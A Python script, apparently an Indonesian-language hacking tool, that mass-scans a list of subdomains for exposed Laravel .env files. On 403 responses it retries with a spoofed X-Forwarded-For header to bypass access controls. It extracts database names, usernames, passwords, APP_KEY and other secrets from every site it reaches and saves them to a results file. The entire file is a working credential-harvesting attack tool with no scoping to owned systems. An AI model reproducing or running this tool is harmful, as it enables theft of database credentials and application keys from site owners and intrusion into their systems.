#!/usr/bin/env python3
# env-scanner.py
import re
import requests
import threading
import os
import time
import argparse

# ANSI color codes
RED = "\033[91m"
RESET = "\033[0m"
GREEN = "\033[92m"
BLUE = "\033[94m"

def WarningBanner():
    print("\033c", end="")  # Membersihkan layar dengan escape sequence ANSI
    warning = f"""{RED}
   🚫 TOOLS INI TIDAK UNTUK DIPERJUALBELIKAN !!! 🚫
{RESET}"""
    print(warning + "\n")

def Banner():
    print("\033c", end="")  # Membersihkan layar dengan escape sequence ANSI
    __banner__ = f"""{RED}
  ⣴⣶⣤⡤⠦⣤⣀⣤⠆      ⣈⣭⣭⣿⣶⣿⣦⣼⣆⠄
   ⠉⠻⢿⣿⠿⣿⣿⣶⣦⠤⠄⡠⢾⣿⣿⡿⠋⠉⠉⠻⣿⣿⡛⣦⠄    
           ⠈⢿⣿⣟⠦⠄⣾⣿⣿⣷⠄⠄⠄⠄⠻⠿⢿⣿⣧⣄
            ⣸⣿⣿⢧ ⢻⠻⣿⣿⣷⣄⣀⠄⠢⣀⡀⠈⠙⠿
           ⢠⣿⣿⣿⠈  ⠡⠌⣻⣿⣿⣿⣿⣿⣿⣿⣛⣳⣤⣀⣀    Tools Auto Scanner Mass Laravel /.env-
   ⢠⣧̷⣶̷̷⣥⡤⢄⠄⣸⣿⣿   ⢀⣴⣿⣿⡿⠛⣿⣿⣧⠈⢿⠿⠟⠛⠻⠿⠄              Author: Vinzzz
 ⣰⣿⣿⠛⠻⣿⣿⡦⢹⣿⣷   ⢊⣿⣿⡏⠄⠄⢸⣿⣿⡇⠄⢀⣠⣄⣾⠄     
⣠⣿⠿⠛  ⣿⣿⣷⠘⢿⣿⣦⡀ ⢸⢿⣿⣿⣄⠄⣸⣿⣿⡇⣪⣿⡿⠿⣿⣷⡄    
⠙⠃    ⣼⣿⡟⠌ ⠈⠻⣿⣿⣦⣌⡇⠻⣿⣿⣷⣿⣿⣿⠐⣿⣿⡇⠄⠛⠻⢷⣄
      ⢻⣿⣿⣄⠄  ⠈⠻⣿⣿⣿⣷⣿⣿⣿⣿⣿⡟⠄⠫⢿⣿⡆    
       ⠻⣿⣿⣿⣿⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⣀⣤⣾⡿⠃
{RESET}"""
    print(__banner__ + "\n")

def fetch_env_file(url, timeout=5):
    """Fetch the .env file from the specified URL, attempting bypass if necessary."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
    }
    try:
        response = requests.get(url.rstrip("/") + "/.env", headers=headers, timeout=timeout)
        if response.status_code == 200 and "=" in response.text:
            return response.text
        elif response.status_code == 403:
            print(f"{BLUE}[!] 403 Forbidden detected, attempting bypass for {url}...{RESET}")
            bypass_headers = headers.copy()
            bypass_headers["X-Forwarded-For"] = "127.0.0.1"
            bypass_headers["Referer"] = url
            response = requests.get(url.rstrip("/") + "/.env", headers=bypass_headers, timeout=timeout)
            if response.status_code == 200 and "=" in response.text:
                return response.text
    except requests.RequestException:
        pass
    return None

def parse_env_content(env_content):
    """Parse the .env content and extract database-related information."""
    env_data = {}
    for line in env_content.splitlines():
        if "=" in line:
            key, value = line.split("=", 1)
            env_data[key.strip()] = value.strip()
    return {k: v for k, v in {
        "database": env_data.get("DB_DATABASE"),
        "username": env_data.get("DB_USERNAME"),
        "password": env_data.get("DB_PASSWORD"),
        "app_name": env_data.get("APP_NAME"),
        "app_env": env_data.get("APP_ENV"),
        "app_key": env_data.get("APP_KEY"),
        "app_debug": env_data.get("APP_DEBUG"),
        "app_url": env_data.get("APP_URL"),
    }.items() if v}

def find_vulnerabilities(env_content):
    """Analyze .env content for potential vulnerabilities."""
    vulnerabilities = []
    if re.search(r"API_KEY=.*", env_content):
        vulnerabilities.append("[!] API key detected in .env file.")
    if re.search(r"SECRET_KEY=.*", env_content):
        vulnerabilities.append("[!] Secret key detected in .env file.")
    if re.search(r"DEBUG=(True|true|1)", env_content):
        vulnerabilities.append("[!] Debug mode is enabled in production.")
    return vulnerabilities

def save_to_file(url, method, parsed_data, vulnerabilities, output_file="hasil.txt"):
    """Save the extracted data into the given output file."""
    with open(output_file, "a") as file:
        file.write(f"URL: {url}\n")
        file.write(f"METHOD: {method}\n")
        for key, value in parsed_data.items():
            file.write(f"{key.upper()}: {value}\n")
        if vulnerabilities:
            file.write("VULNERABILITIES:\n")
            for vuln in vulnerabilities:
                file.write(f"- {vuln}\n")
        file.write("=" * 50 + "\n\n")

def process_url(url, output_file):
    """Process a single URL."""
    print(f"[+] Processing URL: {url}")
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    env_content = fetch_env_file(url)
    if env_content:
        parsed_data = parse_env_content(env_content)
        vulnerabilities = find_vulnerabilities(env_content)

        if parsed_data or vulnerabilities:
            save_to_file(url=url, method="/.env", parsed_data=parsed_data, vulnerabilities=vulnerabilities, output_file=output_file)
            print(f"{GREEN}[+] Valid data saved to {output_file}.{RESET}")
        else:
            print(f"{RED}[!] No valid data found.{RESET}")
    else:
        print(f"{RED}[!] No valid data found.{RESET}")

def main():
    """Main function to run the tool with threading and argparse."""
    parser = argparse.ArgumentParser(
        prog="env-scanner.py",
        description="Env Scanner - mencari file .env pada list subdomain",
        epilog="Contoh penggunaan:\n  python3 env-scanner.py subdomains.txt -t 50 -o hasil.txt\n",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument("file", nargs="?", help="Path ke file list subdomain (contoh: subdomains.txt)")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Jumlah thread concurrent (default: 50)")
    parser.add_argument("--timeout", type=int, default=5, help="Timeout request dalam detik (default: 5)")
    parser.add_argument("-o", "--output", type=str, default="hasil.txt", help="Nama file output untuk menyimpan hasil (default: hasil.txt)")
    args = parser.parse_args()

    # Tampilkan banner
    WarningBanner()
    time.sleep(1)
    Banner()

    # Jika file tidak diberikan via CLI, tanyakan interaktif
    file_path = args.file
    if not file_path:
        file_path = input("Masukin list subdomain lu (contoh: subdomains.txt): ").strip()

    try:
        with open(file_path, "r") as file:
            urls = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"{RED}[!] File not found: {file_path}{RESET}")
        return

    num_threads = args.threads
    timeout = args.timeout
    output_file = args.output
    threads = []

    # Update fetch_env_file timeout via closure (simple approach)
    global fetch_env_file
    old_fetch = fetch_env_file
    def fetch_env_file_with_timeout(url):
        return old_fetch(url, timeout=timeout)
    fetch_env_file = fetch_env_file_with_timeout

    for url in urls:
        thread = threading.Thread(target=process_url, args=(url, output_file))
        thread.start()
        threads.append(thread)
        if len(threads) >= num_threads:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()

